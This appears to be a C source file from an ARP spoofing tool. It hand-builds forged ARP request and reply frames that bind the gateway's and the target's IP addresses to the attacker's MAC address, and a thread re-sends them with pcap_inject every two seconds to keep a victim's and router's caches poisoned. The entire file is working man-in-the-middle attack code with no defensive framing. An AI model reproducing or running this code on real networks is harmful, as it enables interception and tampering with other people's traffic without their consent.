#include "mainArpSpoofing.h"

pcap_t *fp;

int ArpTargetRequest(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *TargetIp, u_char *TargetMac) {
	u_char *t_req_packet = (u_char *)malloc(sizeof(u_char) * ARP_HDR_LEN);
	u_char *tmp = NULL;
	int i, j, result;
	
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;

	eh = (struct libnet_ethernet_hdr *)t_req_packet;
	ah = (struct libnet_arp_hdr *)t_req_packet;
	tmp = t_req_packet;

	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_req_packet + i) = *(TargetMac + i);
	for(j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(t_req_packet + i) = *(RouteMac + j);
	t_req_packet += sizeof(eh->ether_dhost) + sizeof(eh->ether_shost);
	*(t_req_packet + 0) = 0x08;
	*(t_req_packet + 1) = 0x06;
	t_req_packet += sizeof(eh->ether_type);
	for(i = 0; i < 6; i++) {
		switch (i) { 
			case 0:
				*(t_req_packet + i) = 0x00; break;
			case 1:
				*(t_req_packet + i) = 0x01; break;
			case 2:
				*(t_req_packet + i) = 0x08; break;
			case 3:
				*(t_req_packet + i) = 0x00; break;
			case 4:
				*(t_req_packet + i) = 0x06; break;
			case 5:
				*(t_req_packet + i) = 0x04; break;
		}
	}
	t_req_packet += sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
	*(t_req_packet + 1) = ARPOP_REQUEST;
	t_req_packet += sizeof(ah->ar_op);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_req_packet + i) = *(MyMac + i);
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_req_packet + i) = *(RouteIp + j);
	t_req_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_req_packet + i) = 0x00;
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_req_packet + i) = *(TargetIp + j);
	t_req_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);

	t_req_packet -= sizeof(*eh) + sizeof(*ah);
	if((result = pcap_inject(fp, t_req_packet, ARP_HDR_LEN)) < 0) printf("Target Request pcap_inject() Error %d\n", result);

	t_req_packet = tmp;
	free(t_req_packet);
	return 1;
}

int ArpTargetReply(u_char *MyMac, u_char *RouteIp, u_char *TargetIp, u_char *TargetMac) {
	u_char *t_rep_packet = (u_char *)malloc(sizeof(u_char) * ARP_HDR_LEN);
	u_char *tmp = NULL;
	int i, j, result;
	
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;

	eh = (struct libnet_ethernet_hdr *)t_rep_packet;
	ah = (struct libnet_arp_hdr *)t_rep_packet;
	tmp = t_rep_packet;

	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_rep_packet + i) = *(TargetMac + i);
	for(j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(t_rep_packet + i) = *(MyMac + j);
	t_rep_packet += sizeof(eh->ether_dhost) + sizeof(eh->ether_shost);
	*(t_rep_packet + 0) = 0x08;
	*(t_rep_packet + 1) = 0x06;
	t_rep_packet += sizeof(eh->ether_type);
	for(i = 0; i < 6; i++) {
		switch (i) { 
			case 0:
				*(t_rep_packet + i) = 0x00; break;
			case 1:
				*(t_rep_packet + i) = 0x01; break;
			case 2:
				*(t_rep_packet + i) = 0x08; break;
			case 3:
				*(t_rep_packet + i) = 0x00; break;
			case 4:
				*(t_rep_packet + i) = 0x06; break;
			case 5:
				*(t_rep_packet + i) = 0x04; break;
		}
	}
	t_rep_packet += sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
	*(t_rep_packet + 1) = ARPOP_REPLY;
	t_rep_packet += sizeof(ah->ar_op);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_rep_packet + i) = *(MyMac + i);
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_rep_packet + i) = *(RouteIp + j);
	t_rep_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(t_rep_packet + i) = *(TargetMac + i);
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(t_rep_packet + i) = *(TargetIp + j);
	t_rep_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);
	t_rep_packet -= sizeof(*eh) + sizeof(*ah);
	if((result = pcap_inject(fp, t_rep_packet, ARP_HDR_LEN)) < 0) printf("Target Reply pcap_inject() Error %d\n", result);

	t_rep_packet = tmp;
	free(t_rep_packet);
	return 1;
}

int ArpRouteRequest(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *TargetIp) {
	u_char *r_req_packet = (u_char *)malloc(sizeof(u_char) * ARP_HDR_LEN);
	u_char *tmp = NULL;
	int i, j, result;
	
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;

	eh = (struct libnet_ethernet_hdr *)r_req_packet;
	ah = (struct libnet_arp_hdr *)r_req_packet;
	tmp = r_req_packet;

	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_req_packet + i) = *(RouteMac + i);
	for(j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(r_req_packet + i) = *(MyMac + j);
	r_req_packet += sizeof(eh->ether_dhost) + sizeof(eh->ether_shost);
	*(r_req_packet + 0) = 0x08;
	*(r_req_packet + 1) = 0x06;
	r_req_packet += sizeof(eh->ether_type);
	for(i = 0; i < 6; i++) {
		switch (i) { 
			case 0:
				*(r_req_packet + i) = 0x00; break;
			case 1:
				*(r_req_packet + i) = 0x01; break;
			case 2:
				*(r_req_packet + i) = 0x08; break;
			case 3:
				*(r_req_packet + i) = 0x00; break;
			case 4:
				*(r_req_packet + i) = 0x06; break;
			case 5:
				*(r_req_packet + i) = 0x04; break;
		}
	}
	r_req_packet += sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
	*(r_req_packet + 1) = ARPOP_REQUEST;
	r_req_packet += sizeof(ah->ar_op);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_req_packet + i) = *(MyMac + i);
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_req_packet + i) = *(TargetIp + j);
	r_req_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_req_packet + i) = 0x00;
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_req_packet + i) = *(RouteIp + j);
	r_req_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);
	r_req_packet -= sizeof(*eh) + sizeof(*ah);
	if((result = pcap_inject(fp, r_req_packet, ARP_HDR_LEN)) < 0) printf("Route Request pcap_inject() Error %d\n", result);

	r_req_packet = tmp;
	free(r_req_packet);
	return 1;
}

int ArpRouteReply(u_char *MyMac, u_char *RouteIp, u_char *RouteMac, u_char *TargetIp) {
	u_char *r_rep_packet = (u_char *)malloc(sizeof(u_char) * ARP_HDR_LEN);
	u_char *tmp = NULL;
	int i, j, result;
	
	struct libnet_ethernet_hdr *eh;
	struct libnet_arp_hdr *ah;

	eh = (struct libnet_ethernet_hdr *)r_rep_packet;
	ah = (struct libnet_arp_hdr *)r_rep_packet;
	tmp = r_rep_packet;

	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_rep_packet + i) = *(RouteMac + i);
	for(j = 0; i < ETHER_ADDR_LEN * 2; i++, j++) *(r_rep_packet + i) = *(MyMac + j);
	r_rep_packet += sizeof(eh->ether_dhost) + sizeof(eh->ether_shost);
	*(r_rep_packet + 0) = 0x08;
	*(r_rep_packet + 1) = 0x06;
	r_rep_packet += sizeof(eh->ether_type);
	for(i = 0; i < 6; i++) {
		switch (i) { 
			case 0:
				*(r_rep_packet + i) = 0x00; break;
			case 1:
				*(r_rep_packet + i) = 0x01; break;
			case 2:
				*(r_rep_packet + i) = 0x08; break;
			case 3:
				*(r_rep_packet + i) = 0x00; break;
			case 4:
				*(r_rep_packet + i) = 0x06; break;
			case 5:
				*(r_rep_packet + i) = 0x04; break;
		}
	}
	r_rep_packet += sizeof(ah->ar_hrd) + sizeof(ah->ar_pro) + sizeof(ah->ar_hln) + sizeof(ah->ar_pln);
	*(r_rep_packet + 1) = ARPOP_REPLY;
	r_rep_packet += sizeof(ah->ar_op);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_rep_packet + i) = *(MyMac + i);
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_rep_packet + i) = *(TargetIp + j);
	r_rep_packet += sizeof(ah->ar_sha) + sizeof(ah->ar_spa);
	for(i = 0; i < ETHER_ADDR_LEN; i++) *(r_rep_packet + i) = *(RouteMac + i);
	for(j = 0; i < ETHER_ADDR_LEN + IP_ADDR_LEN; i++, j++) *(r_rep_packet + i) = *(RouteIp + j);
	r_rep_packet += sizeof(ah->ar_tha) + sizeof(ah->ar_tpa);
	r_rep_packet -= sizeof(*eh) + sizeof(*ah);
	if((result = pcap_inject(fp, r_rep_packet, ARP_HDR_LEN)) < 0) printf("Route Request pcap_inject() Error %d\n", result);

	r_rep_packet = tmp;
	free(r_rep_packet);
	return 1;
}

void *GetArpRelay_ThreadRun(void *arguments) {
	_SPOOF *arg = (_SPOOF *)arguments;

	while(1) {
		ArpTargetRequest(arg->getMyMac, arg->getRouteIp, arg->getRouteMac, arg->getTargetIp, arg->getTargetMac);
		ArpTargetReply(arg->getMyMac, arg->getRouteIp, arg->getTargetIp, arg->getTargetMac);
		ArpRouteRequest(arg->getMyMac, arg->getRouteIp, arg->getRouteMac, arg->getTargetIp);
		ArpRouteReply(arg->getMyMac, arg->getRouteIp, arg->getRouteMac,arg->getTargetIp);
		sleep(2);
	}

	pthread_exit(NULL);
}

void SetArpRelayPcapHandle(pcap_t *return_fp) {
	fp = return_fp;
}
